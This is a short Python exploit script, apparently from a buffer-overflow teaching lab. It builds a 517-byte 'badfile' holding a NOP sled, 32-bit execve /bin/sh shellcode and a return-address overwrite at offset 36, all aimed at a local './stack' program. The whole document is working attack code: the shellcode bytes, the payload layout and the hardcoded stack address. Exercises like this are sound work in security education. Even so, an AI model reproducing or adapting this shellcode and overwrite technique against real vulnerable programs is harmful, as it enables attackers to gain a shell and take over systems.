#!/usr/bin/env python3
import sys

# 1. Base Address (from your ./stack_debug finding)
base_addr = 0xffffcb08

# 2. The Target Address
# We want to land comfortably in the middle of the NOP sled.
# 0xffffcb08 + 200 = 0xffffcbd0
# This gives us huge margin for error (plus or minus 150 bytes!)
ret = base_addr + 200

# 3. Shellcode (32-bit execve /bin/sh)
shellcode = (
    b"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e"
    b"\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"
)

# 4. Initialize buffer with NOPs (0x90)
# We fill the whole 517 bytes with NOPs first.
content = bytearray(0x90 for i in range(517))

# 5. Place Shellcode at the END
# This prevents it from being overwritten by stack operations.
start = 517 - len(shellcode)
content[start:] = shellcode

# 6. Overwrite the Return Address
# The return address is at offset 36.
offset = 36
# We write 4 bytes containing our target address (0xffffcbd0)
content[offset:offset + 4] = (ret).to_bytes(4, byteorder='little')

# 7. Write the file
with open('badfile', 'wb') as f:
    f.write(content)

print(f"[+] Shellcode placed at end of 517 bytes")
print(f"[+] Return Address overwritten at offset {offset} with {hex(ret)}")
print(f"[+] Exploit generated. Run ./stack")
